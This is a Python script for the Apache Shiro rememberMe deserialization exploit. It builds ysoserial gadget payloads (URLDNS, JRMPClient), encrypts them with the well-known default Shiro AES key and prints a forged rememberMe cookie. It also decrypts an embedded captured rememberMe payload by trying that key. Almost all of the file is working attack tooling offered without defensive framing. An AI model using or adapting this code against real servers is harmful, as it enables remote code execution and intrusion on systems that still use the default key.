import sys
import uuid
import base64
import subprocess
from binascii import hexlify
from Crypto.Cipher import AES
import re

list1 = [
    'R3saZ9/cXMVbUJRfjqt+luhstMe+VFybGmsSOLQZ/DVu45/B+c0t4F2bsA+9puuAui4CXSS5lKKGZZ4RvM6Mx0fy03zxVqvG+9M3bQwBUa0oDN2L1l5ypGk7CKOq7FODvlCJbTwi67d/RnOZySJ5W3/+5gk57nhbPajoLHoeQScgleEU6HMvI3159ZwV4wpcqoRuArnTVIS8FhI7/nWjzvQ2wjdXP672pvipR5Qvq8sFHbMTEAMY4vh+VTsXG/MpmeKigE9froT7A2D0gOhwQzZlfpeey4YudQ7T5Oi9TsxPFE81wWNnNpQvK0uGkrOwKa1MegIl8bPX5CP5odWoOjPiSL3ZMrjtmWbgzay2iDPHBL5Dy/ExgqOjkN06vA4ZgiMCyvqKpnI3+TNIhBu4/uXar3P6Vx/p20gFxZN7ier9aSYSo2GHS9+e42i+m7eRLhnbMQ40qqYVpYG31OIhmFFWyRt6CybKr47H6WfPIbGY7mGfY5R1x+tH5j4CdEInNyYVZUUiRwTGZUnuF6jxfGCXzgyNvAFA2qYMrh3ryYqJW/9fKFJN8f3a4JLcP8Fy/w8f24RXldRWEgI+mDv2pWq+0L2+GvMJ1ynNrx1kokMDZo9Uoj5QSEfOPkCxJZA4Jp4Vi+epF64tzRhDYN/7LkpitYmjFTMtUVV54jPV3nI51WJLFMvYbm9DP/r3eAoQCcERpOdmxy5rtWaeT4kw8G9nDrdOrSvUWPi7saTeIUlVZPksenmpKWo1P3ncRi6SlwF9shbTDDPIQGpSleK6d3lQ0KAuqdND/gpos+eKE28rFCIZ+6TSqxl2biGCdskN6m37bs5ldwLlXblYhL7opceEUJgL2pHgxPLtsYrBRORP8sogD90poDSn3JmdIAOMOMuQfhVdmUQdpByYxSdi57+NCxeJExX/dFauAqOV/vjaPvo+tu7xvXJ1d5w/gwEFQM5pCzXbzNlRcj4/Fti7aTt1lUBlVyoiKfGD3NnqtsQmuw9GJXQBY+28iAWv1J9aSbXZeJ56ByCtnyeJQwMu4Y/H+XaSx1574Aa8MvKJZrA3uG+rcMeV1zqGUCiDBY3FB8GEMv4MfmNWGajMzauF7ViERhIBw5yTn5es+oaJO1PXBZholcGKhkFlt/4VLCrmNAbOEt/wws5cu20Y30vz4japaJYGAj0bjxTQzDg0MOH6ELd2tm8nl12+5tXJoUTsUYZUqr74YTQExaM/45hEDafAYe6XXmO4Ct+qw9s96mOxajEmPXQmbsbhxz/cyKk9o8dJHXqYDkfROc5/xStugsg1oYRY8oOoJ623Xh3JI0/MAgxDGqeNFwfl1+dXkYIL03htoqweGitfhXGOGfLJr4R5WgwDUhjA06JASpgHuDibe1fzt8EDvNF6DhdkovzC9RKP597i0OYV6FPHE9C/7kNvV0OGyBHuCvFKieQgmGRhWCpad4/FfTuBmviuz2fX1xy2TzOZ7F74MXNtzpYb2Mym9/RCptdkB+Df1Cga+UQ4/ZagjOFRclPSV4cZIrsFMwJIabuf2H+8xCZfMsYfYg6fTsUY8FLusd54KwztIQ2lMwYBbRiPa5zR6hdtbjdIRO1qvWvIxffju+vhIsQ3tXnJEU0d5rhbpjD+fNHCCsH8CO9uLmTGT2GKSSYSi+tmVOLGidDK/5vg8d6s48bzLEd/I4jXPuJsSkQ62Zw2JkCmrI12S2fBJOs40PmG09XT3V4faXjB1XVNcpGhCprOd1syFG4ia+g9PHWzpACV9e4kZfcDscBkYetiz6f4G24gez514UViuE1iazaqg/qzg0IakL3JOPrHy/hMIx/6Uk+KE1Lx6IMg6GF8PYWHlEYB6OfSHnbIIlpm2rSD3YIVU0hwhmg2ZjQn4n3BDWHyeA3ARRbqqYZZHQy8QcYx+44i']


def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command],
                             stdout=subprocess.PIPE)
    popen1 = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command],
                              stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(
        "kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    mode = AES.MODE_CBC
    encryptor = AES.new(key, mode, iv)
    file_body = pad(
        popen1.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    print('rememberme=%s' % base64_ciphertext, '\n')
    return base64_ciphertext


def decode_rememberme(payload):
    keylist = ['kPH+bIxk5D2deZiIxcaaaA==']
    for key in keylist:
        mode = AES.MODE_CBC
        IV = payload[:16]
        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)
        remember_bin = encryptor.decrypt(payload[16:])
        remember_bin = remember_bin.decode('unicode-escape')
        if remember_bin:
            print(key)
            return remember_bin


if __name__ == '__main__':
    for payload in list1:
        try:
            tmp = payload
            payload = base64.b64decode(payload)
            data = decode_rememberme(payload)
            print(data)
        except:
            pass
